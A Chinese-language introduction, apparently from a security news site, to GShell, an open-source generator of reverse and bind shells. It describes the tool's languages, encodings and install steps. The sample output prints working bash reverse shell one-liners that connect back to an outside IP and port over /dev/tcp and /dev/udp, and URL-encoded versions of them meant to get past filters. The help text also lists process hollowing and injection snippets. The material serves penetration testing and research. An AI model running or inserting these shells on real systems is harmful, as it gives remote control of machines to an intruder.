![](https://image.3001.net/images/20220626/1656254712_62b870f82c41873aec6da.png!small)  

## 关于GShell

GShell是一款功能强大且支持灵活扩展的跨平台Shell生成器，在该工具的帮助下，广大研究人员可以随意生成针对任意平台的任何Shell，并实现完全的自动化和管理控制功能。

## 支持的操作系统

> 类Unix系统
>
> GNU/Linux
>
> Windows
>
> macOS

## 支持生成的Shell

> Bind-Shel：目标需要有一个监听端口，然后我们连接到目标主机；
>
> 反向Shell：我们又一个监听端口，让目标连接到我们的设备；

## 支持的编码

> URL编码：绕过URL过滤器；
>
> Base64/32/16编码：绕过字符串/关键字过滤器；
>
> PowerShell Base64编码；

## 支持的IP版本

> IPv4
>
> IPv6

## 支持的协议

> TCP
>
> UDP
>
> ICMP

注意：你可以添加你自己使用了其他协议的Shell，比如说DNS。

## 支持的语言和工具

> PowerShell
>
> Python
>
> Bash
>
> Sh
>
> Perl
>
> Socat
>
> Netcat
>
> Nc
>
> Awk
>
> Lua
>
> NodeJS
>
> OpenSSL
>
> PHP
>
> Ruby
>
> Telnet
>
> Golang
>
> C#
>
> Dart
>
> Groovy
>
> ...

上述语言和工具不受任何限制，我们可以根据需要执行添加支持。

Shell相关的内容存储在markdown文件中，支持随意修改。

我们可以通过向下列文件添加markdown代码块来增加更多的Bind Shell：

    
    
    shells/bind_shells.md

你还可以通过向下列文件添加markdown代码块来增加更多的反向Shell：

    
    
    shells/reverse_shells.md

## 工具下载&安装

### Linux安装

广大研究人员可以通过下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/nozerobit/gshell.git

安装依赖组件：

    
    
    python3 -m pip install -r gshell/requirements.txt

将工具添加到$PATH环境变量中：

    
    
    sudo ln -s $(pwd)/gshell/gshell.py /usr/local/bin/gshell.py && chmod +x /usr/local/bin/gshell.py

执行工具：

    
    
    gshell.py

### Windows安装

通过下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/nozerobit/gshell C:\\Tools

以管理员权限运行命令行工具，并安装chocolatey：

    
    
    @powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))" && SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin

在Windows中安装Python 3：

    
    
    choco install -y python3

安装pip：

    
    
    python -m pip install --upgrade pip

安装依赖组件：

    
    
    python -m pip install -r gshell/requirements.txt

切换到项目目录，并运行该工具：

    
    
    cd C:\Tools
    
    python gshell.py

## 工具使用

    
    
    PS C:\gshell> python .\gshell.py -h                                    
    
    usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]
    
     
    
     ██████  ███████ ██   ██ ███████ ██      ██
    
    ██       ██      ██   ██ ██      ██      ██
    
    ██   ███ ███████ ███████ █████   ██      ██
    
    ██    ██      ██ ██   ██ ██      ██      ██
    
     ██████  ███████ ██   ██ ███████ ███████ ███████
    
     
    
    Generate bind shells and/or reverse shells with style
    
     
    
                Version: 1.1
    
                Author: nozerobit
    
                Twitter: @nozerobit
    
     
    
    Options:
    
      -i <IP ADDRESS>, --ip <IP ADDRESS>
    
                            指定IP地址
    
      -p <PORT NUMBER>, --port <PORT NUMBER>
    
                            指定端口号
    
      -s <SHELL TYPE>, --shell <SHELL TYPE>
    
                            指定Shell类型 (python, nc, bash等)
    
     
    
    Payload Types:
    
      -r, --reverse           反向Shell Payload
    
      -b, --bind             Bind Shell Payload
    
     
    
    Snippets Types:
    
      --hollowing           打印进程镂空代码段
    
      --injector            打印进程注入代码段
    
     
    
    Encoding Options:
    
      --base64              添加Base64编码
    
      --base32              添加Base32编码
    
      --base16              添加Base16编码
    
      --url                  添加URL编码
    
     
    
    Markdown Options:
    
      --no-block            Skip ```
    
                            code
    
                            blocks
    
                            ``` while parsing
    
     
    
    Help Options:
    
      -l, --list              枚举所有可用的Shell类型
    
      -a, --advice          打印使用建议和提示
    
      -h, --help            显示帮助信息和退出

## 工具使用样例

### 生成Bash反向Shell

    
    
    PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443  -r -s bash
    
    [+] The IPv4 address: 192.168.111.120 is valid.
    
    [+] The port number: 443 is valid.
    
    [+] Shell type is valid
    
    [+] Preparing reverse shells
    
    [+] Generating bash shells
    
    bash -i >& /dev/tcp/192.168.111.120/443 0>&1
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    0<&amp196exec 196<>/dev/tcp/192.168.111.120/443; sh <&196 >&196 2>&196
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    /bin/bash -l > /dev/tcp/192.168.111.120/443 0<&1 2>&1
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    bash -i >& /dev/tcp/192.168.111.120/443 0>&1
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    bash -i >& /dev/udp/192.168.111.120/443 0>&1

### 编码样例

    
    
    PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443 -r -s bash --url
    
    [+] The IPv4 address: 192.168.111.120 is valid.
    
    [+] The port number: 443 is valid.
    
    [+] Shell type is valid
    
    [+] Preparing reverse shells
    
    [+] Generating bash shells
    
    [+] Adding URL Encoding
    
    bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.111.120%2F443%3B+sh+%3C%26196+%3E%26196+2%3E%26196%0A
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    %2Fbin%2Fbash+-l+%3E+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3C%261+2%3E%261%0A
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A
    
     
    
    ----------------NEXT CODE BLOCK----------------    
     
    
    bash+-i+%3E%26+%2Fdev%2Fudp%2F192.168.111.120%2F443+0%3E%261
    
     
    
    ----------------NEXT CODE BLOCK----------------
## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/nozerobit/gshell/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **GShell** ：【[ _GitHub传送门_](https://github.com/nozerobit/gshell)】

